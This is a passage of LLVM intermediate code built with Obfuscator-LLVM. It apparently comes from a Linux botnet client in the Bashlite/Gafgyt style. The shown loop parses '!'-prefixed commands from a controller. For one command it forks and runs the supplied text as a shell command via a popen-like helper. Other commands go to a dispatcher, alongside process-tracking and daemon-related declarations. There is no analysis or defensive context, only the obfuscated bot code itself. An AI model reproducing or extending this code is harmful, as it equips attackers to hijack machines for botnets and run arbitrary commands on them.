  store i32 0, i32* %23, align 4
  br label %234

; <label>:234:                                    ; preds = %249, %221
  %235 = load i32, i32* %23, align 4
  %236 = zext i32 %235 to i64
  %237 = load i64, i64* @numpids, align 8
  %238 = icmp ult i64 %236, %237
  br i1 %238, label %239, label %252

; <label>:239:                                    ; preds = %234
  %240 = load i32*, i32** @pids, align 8
  %241 = load i32, i32* %23, align 4
  %242 = zext i32 %241 to i64
  %243 = getelementptr inbounds i32, i32* %240, i64 %242
  %244 = load i32, i32* %243, align 4
  %245 = load i32*, i32** %22, align 8
  %246 = load i32, i32* %23, align 4
  %247 = zext i32 %246 to i64
  %248 = getelementptr inbounds i32, i32* %245, i64 %247
  store i32 %244, i32* %248, align 4
  br label %249

; <label>:249:                                    ; preds = %239
  %250 = load i32, i32* %23, align 4
  %251 = add i32 %250, 1
  store i32 %251, i32* %23, align 4
  br label %234

; <label>:252:                                    ; preds = %234
  %253 = load i32*, i32** @pids, align 8
  %254 = bitcast i32* %253 to i8*
  call void @free(i8* %254) #2
  %255 = load i32*, i32** %22, align 8
  store i32* %255, i32** @pids, align 8
  br label %256

; <label>:256:                                    ; preds = %252, %191
  br label %257

; <label>:257:                                    ; preds = %256
  %258 = load i32, i32* %21, align 4
  %259 = add nsw i32 %258, 1
  store i32 %259, i32* %21, align 4
  br label %186

; <label>:260:                                    ; preds = %186
  %261 = load i32, i32* %20, align 4
  %262 = sext i32 %261 to i64
  %263 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i64 0, i64 %262
  store i8 0, i8* %263, align 1
  %264 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %264)
  %265 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %266 = call i8* @strstr(i8* %265, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.395, i32 0, i32 0)) #10
  %267 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %268 = icmp eq i8* %266, %267
  br i1 %268, label %269, label %270

; <label>:269:                                    ; preds = %260
  br label %180

; <label>:270:                                    ; preds = %260
  %271 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %272 = call i8* @strstr(i8* %271, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.418, i32 0, i32 0)) #10
  %273 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  %274 = icmp eq i8* %272, %273
  br i1 %274, label %275, label %283

; <label>:275:                                    ; preds = %270
  %276 = load i32, i32* %10, align 4
  %277 = add nsw i32 %276, 1
  store i32 %277, i32* %10, align 4
  %278 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.419, i32 0, i32 0))
  %279 = load i32, i32* %10, align 4
  %280 = icmp sgt i32 %279, 20
  br i1 %280, label %281, label %282

; <label>:281:                                    ; preds = %275
  call void @exit(i32 0) #14
  unreachable

; <label>:282:                                    ; preds = %275
  br label %469

; <label>:283:                                    ; preds = %270
  %284 = getelementptr inbounds [4096 x i8], [4096 x i8]* %19, i32 0, i32 0
  store i8* %284, i8** %24, align 8
  %285 = load i8*, i8** %24, align 8
  %286 = load i8, i8* %285, align 1
  %287 = zext i8 %286 to i32
  %288 = icmp eq i32 %287, 33
  br i1 %288, label %289, label %468

; <label>:289:                                    ; preds = %283
  %290 = load i8*, i8** %24, align 8
  %291 = getelementptr inbounds i8, i8* %290, i64 1
  store i8* %291, i8** %25, align 8
  br label %292

; <label>:292:                                    ; preds = %304, %289
  %293 = load i8*, i8** %25, align 8
  %294 = load i8, i8* %293, align 1
  %295 = zext i8 %294 to i32
  %296 = icmp ne i32 %295, 32
  br i1 %296, label %297, label %302

; <label>:297:                                    ; preds = %292
  %298 = load i8*, i8** %25, align 8
  %299 = load i8, i8* %298, align 1
  %300 = zext i8 %299 to i32
  %301 = icmp ne i32 %300, 0
  br label %302

; <label>:302:                                    ; preds = %297, %292
  %303 = phi i1 [ false, %292 ], [ %301, %297 ]
  br i1 %303, label %304, label %307

; <label>:304:                                    ; preds = %302
  %305 = load i8*, i8** %25, align 8
  %306 = getelementptr inbounds i8, i8* %305, i32 1
  store i8* %306, i8** %25, align 8
  br label %292

; <label>:307:                                    ; preds = %302
  %308 = load i8*, i8** %25, align 8
  %309 = load i8, i8* %308, align 1
  %310 = zext i8 %309 to i32
  %311 = icmp eq i32 %310, 0
  br i1 %311, label %312, label %313

; <label>:312:                                    ; preds = %307
  br label %180

; <label>:313:                                    ; preds = %307
  %314 = load i8*, i8** %25, align 8
  store i8 0, i8* %314, align 1
  %315 = load i8*, i8** %24, align 8
  %316 = getelementptr inbounds i8, i8* %315, i64 1
  store i8* %316, i8** %25, align 8
  %317 = load i8*, i8** %24, align 8
  %318 = load i8*, i8** %25, align 8
  %319 = call i64 @strlen(i8* %318) #10
  %320 = getelementptr inbounds i8, i8* %317, i64 %319
  %321 = getelementptr inbounds i8, i8* %320, i64 2
  store i8* %321, i8** %24, align 8
  br label %322

; <label>:322:                                    ; preds = %342, %313
  %323 = load i8*, i8** %24, align 8
  %324 = load i8*, i8** %24, align 8
  %325 = call i64 @strlen(i8* %324) #10
  %326 = sub i64 %325, 1
  %327 = getelementptr inbounds i8, i8* %323, i64 %326
  %328 = load i8, i8* %327, align 1
  %329 = zext i8 %328 to i32
  %330 = icmp eq i32 %329, 10
  br i1 %330, label %340, label %331

; <label>:331:                                    ; preds = %322
  %332 = load i8*, i8** %24, align 8
  %333 = load i8*, i8** %24, align 8
  %334 = call i64 @strlen(i8* %333) #10
  %335 = sub i64 %334, 1
  %336 = getelementptr inbounds i8, i8* %332, i64 %335
  %337 = load i8, i8* %336, align 1
  %338 = zext i8 %337 to i32
  %339 = icmp eq i32 %338, 13
  br label %340

; <label>:340:                                    ; preds = %331, %322
  %341 = phi i1 [ true, %322 ], [ %339, %331 ]
  br i1 %341, label %342, label %348

; <label>:342:                                    ; preds = %340
  %343 = load i8*, i8** %24, align 8
  %344 = load i8*, i8** %24, align 8
  %345 = call i64 @strlen(i8* %344) #10
  %346 = sub i64 %345, 1
  %347 = getelementptr inbounds i8, i8* %343, i64 %346
  store i8 0, i8* %347, align 1
  br label %322

; <label>:348:                                    ; preds = %340
  %349 = load i8*, i8** %24, align 8
  store i8* %349, i8** %26, align 8
  br label %350

; <label>:350:                                    ; preds = %362, %348
  %351 = load i8*, i8** %24, align 8
  %352 = load i8, i8* %351, align 1
  %353 = zext i8 %352 to i32
  %354 = icmp ne i32 %353, 32
  br i1 %354, label %355, label %360

; <label>:355:                                    ; preds = %350
  %356 = load i8*, i8** %24, align 8
  %357 = load i8, i8* %356, align 1
  %358 = zext i8 %357 to i32
  %359 = icmp ne i32 %358, 0
  br label %360

; <label>:360:                                    ; preds = %355, %350
  %361 = phi i1 [ false, %350 ], [ %359, %355 ]
  br i1 %361, label %362, label %365

; <label>:362:                                    ; preds = %360
  %363 = load i8*, i8** %24, align 8
  %364 = getelementptr inbounds i8, i8* %363, i32 1
  store i8* %364, i8** %24, align 8
  br label %350

; <label>:365:                                    ; preds = %360
  %366 = load i8*, i8** %24, align 8
  store i8 0, i8* %366, align 1
  %367 = load i8*, i8** %24, align 8
  %368 = getelementptr inbounds i8, i8* %367, i32 1
  store i8* %368, i8** %24, align 8
  %369 = load i8*, i8** %26, align 8
  store i8* %369, i8** %27, align 8
  br label %370

; <label>:370:                                    ; preds = %374, %365
  %371 = load i8*, i8** %27, align 8
  %372 = load i8, i8* %371, align 1
  %373 = icmp ne i8 %372, 0
  br i1 %373, label %374, label %383

; <label>:374:                                    ; preds = %370
  %375 = load i8*, i8** %27, align 8
  %376 = load i8, i8* %375, align 1
  %377 = zext i8 %376 to i32
  %378 = call i32 @toupper(i32 %377) #10
  %379 = trunc i32 %378 to i8
  %380 = load i8*, i8** %27, align 8
  store i8 %379, i8* %380, align 1
  %381 = load i8*, i8** %27, align 8
  %382 = getelementptr inbounds i8, i8* %381, i32 1
  store i8* %382, i8** %27, align 8
  br label %370

; <label>:383:                                    ; preds = %370
  %384 = load i8*, i8** %26, align 8
  %385 = call i32 @strcmp(i8* %384, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.420, i32 0, i32 0)) #10
  %386 = icmp eq i32 %385, 0
  br i1 %386, label %387, label %410

; <label>:387:                                    ; preds = %383
  %388 = call i32 @listFork()
  %389 = icmp ne i32 %388, 0
  br i1 %389, label %390, label %391

; <label>:390:                                    ; preds = %387
  br label %180

; <label>:391:                                    ; preds = %387
  %392 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %392, i8 0, i64 1024, i32 16, i1 false)
  %393 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %394 = load i8*, i8** %24, align 8
  %395 = call i32 (i8*, i8*, ...) @szprintf(i8* %393, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.421, i32 0, i32 0), i8* %394)
  %396 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %397 = call i32 @fdpopen(i8* %396, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.411, i32 0, i32 0))
  store i32 %397, i32* %29, align 4
  br label %398

; <label>:398:                                    ; preds = %403, %391
  %399 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  %400 = load i32, i32* %29, align 4
  %401 = call i8* @fdgets(i8* %399, i32 1024, i32 %400)
  %402 = icmp ne i8* %401, null
  br i1 %402, label %403, label %407

; <label>:403:                                    ; preds = %398
  %404 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @trim(i8* %404)
  %405 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %405, i8 0, i64 1024, i32 16, i1 false)
  %406 = call i32 @sleep(i32 1)
  br label %398

; <label>:407:                                    ; preds = %398
  %408 = load i32, i32* %29, align 4
  %409 = call i32 @fdpclose(i32 %408)
  call void @exit(i32 0) #14
  unreachable

; <label>:410:                                    ; preds = %383
  store i32 1, i32* %31, align 4
  %411 = load i8*, i8** %24, align 8
  %412 = call i8* @strtok(i8* %411, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.422, i32 0, i32 0)) #2
  store i8* %412, i8** %32, align 8
  %413 = load i8*, i8** %26, align 8
  %414 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 0
  store i8* %413, i8** %414, align 16
  br label %415

; <label>:415:                                    ; preds = %446, %410
  %416 = load i8*, i8** %32, align 8
  %417 = icmp ne i8* %416, null
  br i1 %417, label %418, label %448

; <label>:418:                                    ; preds = %415
  %419 = load i8*, i8** %32, align 8
  %420 = load i8, i8* %419, align 1
  %421 = zext i8 %420 to i32
  %422 = icmp ne i32 %421, 10
  br i1 %422, label %423, label %446

; <label>:423:                                    ; preds = %418
  %424 = load i8*, i8** %32, align 8
  %425 = call i64 @strlen(i8* %424) #10
  %426 = add i64 %425, 1
  %427 = call noalias i8* @malloc(i64 %426) #2
  %428 = load i32, i32* %31, align 4
  %429 = sext i32 %428 to i64
  %430 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %429
  store i8* %427, i8** %430, align 8
  %431 = load i32, i32* %31, align 4
  %432 = sext i32 %431 to i64
  %433 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %432
  %434 = load i8*, i8** %433, align 8
  %435 = load i8*, i8** %32, align 8
  %436 = call i64 @strlen(i8* %435) #10
  %437 = add i64 %436, 1
  call void @llvm.memset.p0i8.i64(i8* %434, i8 0, i64 %437, i32 1, i1 false)
  %438 = load i32, i32* %31, align 4
  %439 = sext i32 %438 to i64
  %440 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %439
  %441 = load i8*, i8** %440, align 8
  %442 = load i8*, i8** %32, align 8
  %443 = call i8* @strcpy(i8* %441, i8* %442) #2
  %444 = load i32, i32* %31, align 4
  %445 = add nsw i32 %444, 1
  store i32 %445, i32* %31, align 4
  br label %446

; <label>:446:                                    ; preds = %423, %418
  %447 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.422, i32 0, i32 0)) #2
  store i8* %447, i8** %32, align 8
  br label %415

; <label>:448:                                    ; preds = %415
  %449 = load i32, i32* %31, align 4
  %450 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i32 0, i32 0
  call void @processCmd(i32 %449, i8** %450)
  %451 = load i32, i32* %31, align 4
  %452 = icmp sgt i32 %451, 1
  br i1 %452, label %453, label %467

; <label>:453:                                    ; preds = %448
  store i32 1, i32* %33, align 4
  store i32 1, i32* %33, align 4
  br label %454

; <label>:454:                                    ; preds = %463, %453
  %455 = load i32, i32* %33, align 4
  %456 = load i32, i32* %31, align 4
  %457 = icmp slt i32 %455, %456
  br i1 %457, label %458, label %466

; <label>:458:                                    ; preds = %454
  %459 = load i32, i32* %33, align 4
  %460 = sext i32 %459 to i64
  %461 = getelementptr inbounds [10 x i8*], [10 x i8*]* %30, i64 0, i64 %460
  %462 = load i8*, i8** %461, align 8
  call void @free(i8* %462) #2
  br label %463

; <label>:463:                                    ; preds = %458
  %464 = load i32, i32* %33, align 4
  %465 = add nsw i32 %464, 1
  store i32 %465, i32* %33, align 4
  br label %454

; <label>:466:                                    ; preds = %454
  br label %467

; <label>:467:                                    ; preds = %466, %448
  br label %468

; <label>:468:                                    ; preds = %467, %283
  br label %180

; <label>:469:                                    ; preds = %282, %180
  br label %169
                                                  ; No predecessors!
  %471 = load i32, i32* %3, align 4
  ret i32 %471
}

; Function Attrs: nounwind
declare i8* @strncpy(i8*, i8*, i64) #4

declare i32 @prctl(...) #3

declare %struct._IO_FILE* @fopen(i8*, i8*) #3

; Function Attrs: nounwind
declare i8* @getcwd(i8*, i64) #4

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #4

declare i8* @fgets(i8*, i32, %struct._IO_FILE*) #3

; Function Attrs: nounwind readonly
declare i32 @strcasecmp(i8*, i8*) #1

declare i32 @fclose(%struct._IO_FILE*) #3

declare i32 @fputs(i8*, %struct._IO_FILE*) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146576028}
!2 = !{i32 -2146575337}
!3 = !{i32 -2146574643}
!4 = !{i32 -2146573883}
!5 = !{i32 -2146573060}
!6 = !{i32 -2146572153}
